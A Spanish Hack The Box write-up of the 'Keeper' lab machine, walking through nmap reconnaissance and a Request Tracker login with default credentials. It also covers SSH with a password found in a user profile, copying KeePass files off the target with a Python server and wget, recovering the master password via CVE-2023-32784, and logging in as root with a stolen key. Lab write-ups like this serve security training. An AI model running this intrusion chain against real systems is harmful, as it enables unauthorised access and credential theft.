# 🗂️ Writeup HTB — Keeper

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Linux
> **🎯 IP:** 10.129.14.68
> **💀 Dificultad:** Fácil
> **🌐 Plataforma:** Hack The Box

---

## 🔍 Reconocimiento y Enumeración

Antes de comenzar con la enumeración activa, lanzamos un ping para verificar conectividad con la máquina objetivo. Además del simple echo reply, el valor del **TTL** nos permite intuir el sistema operativo: un TTL cercano a **128** indica Windows, mientras que uno cercano a **64** apunta a Linux.

> [!tip] Verificación de conectividad y detección de OS por TTL
> ```bash
> ping -c 1 10.129.14.68
> ```
>
> `-c 1` — Envía **un único paquete ICMP** y termina, en lugar de pingear indefinidamente.
> `10.129.14.68` — **IP objetivo** a la que se lanza el ping.

![](assets/Keeper-img-13-03-2026.png)

Obtenemos respuesta con un TTL de **63**, lo que confirma que estamos ante una máquina **Linux**. El TTL parte de 64 y se decrementa en 1 por cada salto de red hasta llegar a nosotros. Confirmada la conectividad, procedemos con la enumeración de puertos.

---

### 👁️ Enumeración con Nmap

#### 🔎 Enumeración de puertos

Comenzamos identificando qué puertos se encuentran abiertos sobre el rango completo de los 65535 posibles. Usamos un SYN Scan, que envía paquetes SYN sin completar el three-way handshake TCP, lo que lo hace más rápido y menos ruidoso que un TCP Connect Scan completo.

> [!tip] Escaneo de puertos completo y sigiloso
> ```bash
> nmap -sS -p- --open --min-rate 5000 -n -Pn 10.129.14.68 -vvv -oN ports
> ```
>
> `-sS` — **SYN Scan** (half-open). Envía SYN, recibe SYN-ACK si el puerto está abierto o RST si está cerrado, sin completar nunca el handshake. Más sigiloso que un connect scan completo. Requiere privilegios de root.
> `-p-` — Escanea los **65535 puertos** posibles, desde el 1 hasta el 65535.
> `--open` — Muestra **únicamente los puertos abiertos**, filtrando los cerrados y filtrados.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo** para acelerar el escaneo.
> `-n` — Sin resolución DNS — evita latencia adicional y ruido en la red.
> `-Pn` — Sin ping previo — asume el host activo aunque ICMP esté bloqueado por el firewall.
> `10.129.14.68` — **IP objetivo** del escaneo.
> `-vvv` — **Triple verbose** — muestra los puertos abiertos en tiempo real sin esperar al final del escaneo.
> `-oN ports` — Guarda el output en formato legible en el archivo `ports`.

![](assets/Keeper-img-13-03-2026-1.png)

El escaneo revela **dos puertos abiertos**: `22` (SSH) y `80` (HTTP).

---

#### 🔬 Enumeración de versiones y servicios

Con los puertos identificados, lanzamos un segundo escaneo más profundo apuntando únicamente a los puertos `22` y `80` para determinar qué servicios y versiones exactas corren en cada uno, ejecutando además los scripts NSE por defecto para obtener información adicional.

> [!tip] Detección de versiones y scripts sobre puertos seleccionados
> ```bash
> nmap -sC -sV -p22,80 --min-rate 5000 -n -Pn -vvv 10.129.14.68 -oN version
> ```
>
> `-sC` — Lanza los **scripts por defecto** del motor NSE (Nmap Scripting Engine). Incluye detección de banners, enumeración básica de servicios y comprobaciones de configuraciones inseguras conocidas.
> `-sV` — **Detección de versiones** — envía probes adicionales para identificar el software exacto y su versión en cada puerto.
> `-p22,80` — Escanea **únicamente los puertos 22 y 80**, los descubiertos en el paso anterior. Más rápido y preciso que escanear todos de nuevo.
> `--min-rate 5000` — Mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo.
> `-vvv` — **Triple verbose**.
> `10.129.14.68` — **IP objetivo**.
> `-oN version` — Guarda el output en el archivo `version`.

![](assets/Keeper-img-13-03-2026-2.png)

Los resultados confirman:
- **Puerto 22** — OpenSSH 8.9p1 (Ubuntu Linux)
- **Puerto 80** — nginx 1.18.0 — servidor web HTTP

---

### 🌐 Enumeración del servicio web — Puerto 80

Al acceder a `http://10.129.14.68` en el navegador, el servidor nos redirige al dominio `keeper.htb` y muestra un mensaje que referencia explícitamente el subdominio `tickets.keeper.htb`. Hay dos conclusiones directas: el servidor tiene **virtual hosting** activo y hay un sistema de tickets corriendo en el subdominio.

![](assets/Keeper-img-13-03-2026-3.png)

Añadimos ambas entradas al archivo `/etc/hosts` para que nuestro sistema resuelva correctamente estos nombres de dominio:

> [!tip] Añadir entradas de virtual hosting al archivo /etc/hosts
> ```bash
> echo "10.129.14.68 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
> ```
>
> `echo "10.129.14.68 keeper.htb tickets.keeper.htb"` — Genera la línea de resolución con la IP del objetivo y los dos dominios asociados separados por espacios.
> `sudo tee -a /etc/hosts` — Añade (`-a`, append) la línea al final de `/etc/hosts` con privilegios de root. Se usa `tee` en lugar de `>>` porque la redirección con `sudo >>` no funciona al no elevar la redirección del shell.

Una vez añadidas las entradas, navegamos a `http://tickets.keeper.htb/rt` y encontramos un panel de login del software **Request Tracker (RT) versión 4.4.4** — un sistema de gestión de tickets corporativo open source ampliamente utilizado en entornos empresariales.

![](assets/Keeper-img-13-03-2026-4.png)

Al intentar acceder a una ruta inexistente en el servidor, obtenemos un mensaje de error que revela la estructura interna de la aplicación y sugiere la posible existencia de logs en rutas accesibles:

![](assets/Keeper-img-13-03-2026-6.png)

Complementamos la enumeración con `whatweb` para obtener una visión tecnológica más completa del servidor:

> [!info] **whatweb**
> Herramienta de fingerprinting web que identifica tecnologías usadas por un sitio: CMS, frameworks, servidor web, versiones de software, cabeceras HTTP relevantes, cookies, etc. Equivalente a Wappalyzer pero desde línea de comandos, lo que permite integrarlo en scripts y pipelines de reconocimiento.

> [!tip] Fingerprinting tecnológico del servidor web con whatweb
> ```bash
> whatweb http://tickets.keeper.htb/rt
> ```
>
> `http://tickets.keeper.htb/rt` — URL completa del panel RT a analizar. whatweb enviará peticiones HTTP e inspeccionará las respuestas para identificar todas las tecnologías presentes.

![](assets/Keeper-img-13-03-2026-8.png)

El output confirma la versión **RT 4.4.4** y el servidor nginx. Con la versión exacta del software identificada, tenemos toda la información necesaria para buscar vectores de acceso.

---

## 💥 Explotación

### 🔑 Paso 1 — Acceso al panel RT con credenciales por defecto

Request Tracker, como muchos sistemas de gestión instalados en entornos corporativos, se despliega con credenciales por defecto documentadas públicamente. Una búsqueda rápida sobre las credenciales por defecto de RT revela que son `root:password`. Las probamos en el panel de login de `http://tickets.keeper.htb/rt`.

El acceso tiene éxito — el administrador nunca cambió las credenciales tras la instalación inicial.

![](assets/Keeper-img-13-03-2026-5.png)

> [!important] Las credenciales por defecto son uno de los vectores de entrada más frecuentes en entornos reales. Sistemas como RT, Jenkins, Tomcat, Grafana o paneles de administración de red frecuentemente se despliegan sin cambiar las credenciales de instalación, especialmente cuando el despliegue fue realizado por personal sin formación específica en seguridad o en entornos considerados "de confianza" dentro de la red interna.

---

### 🔎 Paso 2 — Enumeración de usuarios y tickets

Una vez dentro del panel de administración, navegamos a `Admin → Users` y encontramos dos usuarios registrados: `root` (sesión actual) y `lnorgaard`. Anotamos este nombre de usuario como candidato para acceso SSH.

Explorando el perfil del usuario `lnorgaard` en el panel de administración, encontramos en el campo de comentarios la cadena `Welcome2023!`, que parece ser la contraseña inicial asignada al crear la cuenta. Esta información, almacenada en texto claro en el perfil del usuario, es un hallazgo crítico.

![](assets/Keeper-img-13-03-2026-11.png)

A continuación navegamos a `Search → Tickets → Recently Viewed` y localizamos un ticket abierto por `lnorgaard` con **prioridad 10** (máxima) relacionado con un problema de KeePass en Windows.

![](assets/Keeper-img-13-03-2026-9.png)

El hilo del ticket contiene información muy valiosa:

![](assets/Keeper-img-13-03-2026-10.png)

El usuario `root` indica que ha adjuntado un archivo de **crash dump de KeePass** al ticket. `lnorgaard` responde confirmando que ha descargado el archivo, lo ha guardado en su directorio home por seguridad, y ha eliminado el adjunto del ticket. No podemos acceder al adjunto desde aquí porque fue borrado, pero ya sabemos exactamente dónde está: en el home de `lnorgaard`.

**Información extraída del ticket:**
- Existe un **crash dump de KeePass** en `/home/lnorgaard/`
- Existe una base de datos KeePass (`.kdbx`) en el sistema
- El usuario `lnorgaard` usa KeePass activamente en un entorno Windows

---

### 🚪 Paso 3 — Acceso SSH con credenciales encontradas

Con el usuario `lnorgaard` y la contraseña `Welcome2023!` obtenida del perfil, intentamos el acceso SSH:

> [!tip] Acceso SSH con las credenciales obtenidas del panel RT
> ```bash
> ssh lnorgaard@10.129.14.68
> ```
>
> `lnorgaard` — Usuario descubierto en el panel de administración de RT.
> `10.129.14.68` — IP de la máquina objetivo.
> La contraseña `Welcome2023!` fue encontrada en el campo de comentarios del perfil del usuario en el panel RT.

El acceso tiene éxito. Obtenemos una shell como el usuario `lnorgaard`.

![](assets/Keeper-img-13-03-2026-12.png)

Tenemos la **flag de usuario** en `/home/lnorgaard/user.txt`.

---

## 🔼 Escalada de Privilegios

### 📦 Paso 1 — Localizar y extraer el crash dump de KeePass

Recordando el hilo del ticket, buscamos el archivo en el directorio home del usuario comprometido:

> [!tip] Listar contenido del directorio home del usuario
> ```bash
> ls -la /home/lnorgaard/
> ```
>
> `-la` — Lista todos los archivos (`-a`, incluyendo ocultos) en formato largo (`-l`) mostrando permisos, propietario, tamaño y fecha de modificación.
> `/home/lnorgaard/` — Directorio home del usuario comprometido donde, según el ticket, se guardó el crash dump.

Encontramos el archivo `RT30000.zip`. Lo extraemos:

> [!tip] Descomprimir el archivo ZIP con los archivos de KeePass
> ```bash
> unzip RT30000.zip
> ```
>
> `RT30000.zip` — Archivo comprimido que contiene los artefactos del crash de KeePass mencionados en el ticket.

![](assets/Keeper-img-13-03-2026-13.png)

La extracción nos da dos archivos clave:
- `KeePassDumpFull.dmp` — Volcado completo de memoria del proceso KeePass
- `passcodes.kdbx` — Base de datos KeePass cifrada con las contraseñas del usuario

---

### 📥 Paso 2 — Transferir los archivos al atacante

Para trabajar con herramientas de análisis en nuestra máquina, transferimos los archivos levantando un servidor HTTP en el pivot:

> [!tip] Servir los archivos desde el objetivo con un servidor HTTP Python
> ```bash
> # En la máquina objetivo (sesión SSH como lnorgaard)
> python3 -m http.server 8081
> ```
>
> `-m http.server` — Módulo de Python que levanta un servidor HTTP en el directorio de trabajo actual, sirviendo todos los archivos presentes.
> `8081` — Puerto donde escuchará el servidor. Se elige un puerto alto para evitar conflictos con servicios existentes y no requerir privilegios de root.

> [!tip] Descargar los archivos desde la máquina atacante
> ```bash
> # En la máquina atacante
> wget http://10.129.14.68:8081/KeePassDumpFull.dmp
> wget http://10.129.14.68:8081/passcodes.kdbx
> ```
>
> `wget http://10.129.14.68:8081/KeePassDumpFull.dmp` — Descarga el volcado de memoria de KeePass desde el servidor HTTP que acabamos de levantar en el objetivo.
> `wget http://10.129.14.68:8081/passcodes.kdbx` — Descarga la base de datos KeePass cifrada.
> `10.129.14.68:8081` — IP del objetivo y puerto del servidor HTTP temporal.

---

### 🔓 Paso 3 — Extraer la contraseña maestra del dump con CVE-2023-32784

> [!info] **CVE-2023-32784 — KeePass Master Password Dump**
> Vulnerabilidad crítica en KeePass 2.x (versiones anteriores a 2.54) que permite extraer la contraseña maestra en texto casi completo directamente desde un volcado de memoria del proceso, un archivo de hibernación (`hiberfil.sys`) o el archivo de paginación (`pagefile.sys`). KeePass construye la contraseña maestra carácter a carácter usando un control personalizado `SecureTextBoxEx` que deja rastros de cada carácter procesado en memoria heap como strings de longitud creciente (por ejemplo: `•`, `•o`, `•od`, `•odg`...). La herramienta `keepass-password-dumper` busca estos patrones en el dump y reconstruye la contraseña, recuperando todos los caracteres excepto el primero.

> [!info] **keepass-password-dumper** 📄 [github.com/vdohney/keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper)
> Herramienta .NET escrita en C# que explota CVE-2023-32784 para extraer la contraseña maestra de KeePass desde un volcado de memoria. Requiere .NET SDK 7.0 o superior. Lee el archivo `.dmp` y busca los patrones de memoria característicos del control `SecureTextBoxEx`, reconstruyendo la contraseña carácter a carácter.

Clonamos la herramienta:

> [!tip] Clonar keepass-password-dumper
> ```bash
> git clone https://github.com/vdohney/keepass-password-dumper.git
> cd keepass-password-dumper
> ```

La herramienta requiere .NET SDK 7.0, que puede no estar instalado en el sistema. Para evitar contaminar el sistema con dependencias, usamos Docker para crear un entorno aislado con la versión correcta de .NET:

**Paso 1 — Crear el Dockerfile:**

> [!tip] Crear el Dockerfile para el entorno .NET 7
> ```bash
> cat > Dockerfile << 'EOF'
> FROM mcr.microsoft.com/dotnet/sdk:7.0
> WORKDIR /app
> CMD ["/bin/bash"]
> EOF
> ```
>
> `FROM mcr.microsoft.com/dotnet/sdk:7.0` — Imagen base oficial de Microsoft con el SDK de .NET 7.0 completo, necesario para compilar y ejecutar la herramienta.
> `WORKDIR /app` — Establece `/app` como directorio de trabajo dentro del contenedor.
> `CMD ["/bin/bash"]` — Comando por defecto al iniciar el contenedor: una shell bash interactiva.

**Paso 2 — Construir la imagen Docker:**

> [!tip] Construir la imagen Docker con .NET SDK 7
> ```bash
> docker build -t dotnet7 .
> ```
>
> `build` — Construye una imagen Docker a partir del Dockerfile en el directorio actual.
> `-t dotnet7` — **Tag**: nombre que asignamos a la imagen para referenciarla fácilmente.
> `.` — Contexto de build: el directorio actual, donde está el Dockerfile.

**Paso 3 — Lanzar el contenedor montando el directorio de trabajo:**

> [!tip] Ejecutar el contenedor con el directorio de keepass-password-dumper montado
> ```bash
> docker run -it --rm \
>     -v /home/USER/Escritorio/HTB/Keeper/keepass-password-dumper:/app \
>     dotnet7
> ```
>
> `run` — Crea y arranca un nuevo contenedor.
> `-it` — **Interactive + TTY**: `-i` mantiene stdin abierto, `-t` asigna una pseudo-terminal. Necesario para obtener una shell interactiva.
> `--rm` — Elimina el contenedor automáticamente al salir — evita acumular contenedores parados.
> `-v /home/USER/Escritorio/HTB/Keeper/keepass-password-dumper:/app` — **Bind mount**: monta el directorio local del proyecto en `/app` dentro del contenedor. Los archivos del host son accesibles en tiempo real desde el contenedor sin necesidad de copiarlos.
> `dotnet7` — Nombre de la imagen que acabamos de construir.

**Paso 4 — Ejecutar la herramienta dentro del contenedor:**

> [!tip] Ejecutar keepass-password-dumper contra el volcado de memoria
> ```bash
> # Dentro del contenedor Docker
> dotnet run KeePassDumpFull.dmp
> ```
>
> `dotnet run` — Compila y ejecuta el proyecto .NET en el directorio actual (`/app`, donde está el código de keepass-password-dumper).
> `KeePassDumpFull.dmp` — Argumento: ruta al volcado de memoria del proceso KeePass del que queremos extraer la contraseña maestra.

![](assets/Keeper-img-14-03-2026.png)

La herramienta extrae la contraseña maestra del dump. Debido a cómo funciona CVE-2023-32784, el primer carácter no puede ser recuperado con certeza — la herramienta lo muestra como un conjunto de candidatos. El resultado obtenido es algo similar a `●odgrød med fløde`, donde `●` representa el carácter desconocido.

> [!important] El primer carácter de la contraseña no es recuperable con certeza por keepass-password-dumper — es una limitación intrínseca del exploit. Sin embargo, en este caso la cadena `odgrød med fløde` es reconocible como una frase en **danés** (el idioma de `lnorgaard`, nombre de origen danés) que significa "groat rojo con nata" — un postre típico de Dinamarca. Con este contexto cultural, el primer carácter es trivialmente deducible: la contraseña completa es `rødgrød med fløde`.

---

### 🗝️ Paso 4 — Abrir la base de datos KeePass y obtener la clave SSH de root

Con la contraseña maestra `rødgrød med fløde`, abrimos el archivo `passcodes.kdbx`:

> [!info] **KeePass / kpcli**
> KeePass es un gestor de contraseñas open source que almacena las credenciales cifradas en archivos `.kdbx` protegidos con una contraseña maestra. `kpcli` es un cliente de línea de comandos para abrir y navegar bases de datos KeePass desde la terminal, sin necesidad de interfaz gráfica.

> [!tip] Abrir la base de datos KeePass con kpcli
> ```bash
> kpcli --kdb passcodes.kdbx
> # Introduce la contraseña maestra cuando se solicite: rødgrød med fløde
> ```
>
> `--kdb passcodes.kdbx` — Especifica el archivo de base de datos KeePass a abrir.
> La contraseña maestra `rødgrød med fløde` se introduce de forma interactiva cuando el prompt lo solicita.

Dentro de la base de datos, navegamos por las entradas y encontramos una entrada para el usuario `root` que contiene una **clave privada en formato PuTTY (`.ppk`)**. Este es el vector para escalar a root.

> [!info] **Formato PPK — PuTTY Private Key**
> Las claves privadas SSH pueden almacenarse en múltiples formatos. El formato `.ppk` es el nativo de PuTTY (herramienta SSH para Windows). Para usarlo con el cliente SSH estándar de Linux, es necesario convertirlo al formato OpenSSH estándar usando la herramienta `puttygen`.

> [!tip] Convertir la clave PPK de PuTTY al formato OpenSSH estándar
> ```bash
> # Guardar el contenido PPK en un archivo
> # (copiar el contenido de la entrada KeePass en un archivo .ppk)
> nano root.ppk   # pegar el contenido de la clave
>
> # Convertir de formato PuTTY (.ppk) a formato OpenSSH (.pem)
> puttygen root.ppk -O private-openssh -o root.pem
> ```
>
> `puttygen root.ppk` — Herramienta de conversión de claves de PuTTY. Toma el archivo `.ppk` como entrada.
> `-O private-openssh` — **Output format**: convierte al formato de clave privada OpenSSH estándar, compatible con el cliente `ssh` de Linux.
> `-o root.pem` — Archivo de salida con la clave privada convertida.

> [!tip] Ajustar permisos de la clave privada y conectar como root
> ```bash
> chmod 600 root.pem
> ssh -i root.pem root@10.129.14.68
> ```
>
> `chmod 600 root.pem` — **Permisos obligatorios**: el cliente SSH rechaza claves privadas que no tengan permisos restrictivos (solo lectura/escritura para el propietario). Sin este paso, SSH devuelve el error `WARNING: UNPROTECTED PRIVATE KEY FILE!` y rechaza la conexión.
> `-i root.pem` — **Identity file**: especifica la clave privada a usar para la autenticación en lugar de contraseña.
> `root@10.129.14.68` — Usuario `root` en la IP objetivo.

Obtenemos una shell como **root**. La flag de root se encuentra en `/root/root.txt`.

---

## 📝 Lecciones Aprendidas

**1 — Las credenciales por defecto siguen siendo un vector de entrada real.** Request Tracker con `root:password` es un ejemplo de un patrón extremadamente común: software instalado, funcional, y nunca endurecido. En cualquier assessment, probar credenciales por defecto en todos los paneles web debe ser una de las primeras acciones.

**2 — La información en sistemas de tickets es frecuentemente sensible.** Los sistemas de ticketing corporativos como RT, Jira o ServiceNow acumulan información técnica detallada sobre la infraestructura. Una vez dentro de uno de ellos, revisar el historial de tickets puede revelar rutas de archivos, tecnologías en uso, vulnerabilidades conocidas internas, e incluso credenciales en texto claro como en este caso.

**3 — Los campos de comentarios en paneles de administración son una fuente de credenciales.** La contraseña `Welcome2023!` estaba almacenada en el campo de descripción del perfil de usuario en RT — un error de administración que expone credenciales a cualquier usuario con acceso de administrador al sistema.

**4 — CVE-2023-32784 demuestra que la seguridad de un gestor de contraseñas depende también del entorno.** KeePass es software de seguridad legítimo y bien diseñado, pero un crash dump del proceso en disco es suficiente para comprometer la contraseña maestra. Los archivos de volcado de memoria, hibernación y paginación deben tratarse como material sensible con el mismo nivel de protección que las propias bases de datos de contraseñas.

**5 — Las claves privadas en gestores de contraseñas son objetivos de alto valor.** Encontrar una clave `.ppk` de root en una base de datos KeePass es el escenario ideal para un atacante — una sola clave compromete el acceso más privilegiado del sistema sin necesidad de crackear ninguna contraseña adicional.